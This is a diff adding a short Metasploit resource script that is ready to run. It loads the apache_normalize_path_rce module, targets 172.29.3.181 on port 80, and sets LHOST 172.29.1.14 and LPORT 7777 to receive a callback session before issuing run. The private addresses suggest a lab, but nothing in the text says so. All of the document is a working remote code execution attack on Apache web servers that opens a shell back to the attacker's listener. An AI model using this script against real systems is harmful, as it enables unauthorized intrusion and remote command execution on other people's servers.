@@ -1,0 +1,7 @@
+use exploit/multi/http/apache_normalize_path_rce
+set RHOSTS 172.29.3.181
+set RPORT 80
+set SSL false
+set LHOST 172.29.1.14
+set LPORT 7777
+run
